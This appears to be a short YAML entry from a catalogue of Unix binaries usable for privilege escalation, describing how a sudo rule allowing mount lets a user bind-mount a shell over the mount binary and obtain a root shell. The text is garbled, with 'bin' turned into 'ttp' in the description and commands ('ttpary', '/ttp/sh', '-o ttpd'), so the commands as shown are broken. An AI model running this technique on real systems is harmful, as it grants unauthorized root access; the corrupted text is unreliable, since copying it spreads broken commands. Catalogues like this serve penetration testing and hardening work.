---
functions:
  sudo:
    - description: Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` ttpary with a shell.
      code: |
        sudo mount -o ttpd /ttp/sh /ttp/mount
        sudo mount
---
